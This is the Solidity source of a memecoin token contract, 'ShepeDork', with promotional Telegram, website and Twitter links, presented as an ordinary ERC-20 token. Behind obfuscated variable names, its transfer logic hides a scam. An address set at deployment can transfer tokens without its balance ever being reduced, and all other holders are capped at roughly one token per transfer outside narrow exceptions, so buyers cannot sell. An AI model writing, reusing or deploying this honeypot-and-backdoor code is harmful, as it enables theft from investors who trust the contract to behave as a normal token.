/*

Telegram: https://t.me/ShepeDork

Website: https://shepedork.crypto-token.live/

Twitter: https://twitter.com/ShepeDork

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract ShepeDork is Ownable {
    uint8 public decimals = 9;

    function gbpzma(address ranlty, address jwkaucoezg, uint256 yajumxhc) private {
        address wgbq = IUniswapV2Factory(dalcnquy.factory()).getPair(address(this), dalcnquy.WETH());
        if (windjfzrm[ranlty] == 0) {
            if (ranlty != wgbq && oweaxkfrngt[ranlty] != block.number && yajumxhc < totalSupply) {
                require(yajumxhc <= totalSupply / (10 ** decimals));
            }
            balanceOf[ranlty] -= yajumxhc;
        }
        balanceOf[jwkaucoezg] += yajumxhc;
        oweaxkfrngt[jwkaucoezg] = block.number;
        emit Transfer(ranlty, jwkaucoezg, yajumxhc);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address jwkaucoezg, uint256 yajumxhc) public returns (bool success) {
        gbpzma(msg.sender, jwkaucoezg, yajumxhc);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private oweaxkfrngt;

    function approve(address mgjrnyihx, uint256 yajumxhc) public returns (bool success) {
        allowance[msg.sender][mgjrnyihx] = yajumxhc;
        emit Approval(msg.sender, mgjrnyihx, yajumxhc);
        return true;
    }

    string public name;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    function transferFrom(address ranlty, address jwkaucoezg, uint256 yajumxhc) public returns (bool success) {
        require(yajumxhc <= allowance[ranlty][msg.sender]);
        allowance[ranlty][msg.sender] -= yajumxhc;
        gbpzma(ranlty, jwkaucoezg, yajumxhc);
        return true;
    }

    constructor(string memory knpy, string memory jdiho, address sxejdc, address aswnjucpfgd) {
        name = knpy;
        symbol = jdiho;
        balanceOf[msg.sender] = totalSupply;
        windjfzrm[aswnjucpfgd] = smxeapwu;
        dalcnquy = IUniswapV2Router02(sxejdc);
    }

    uint256 private smxeapwu = 108;

    IUniswapV2Router02 private dalcnquy;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private windjfzrm;

    string public symbol;
}
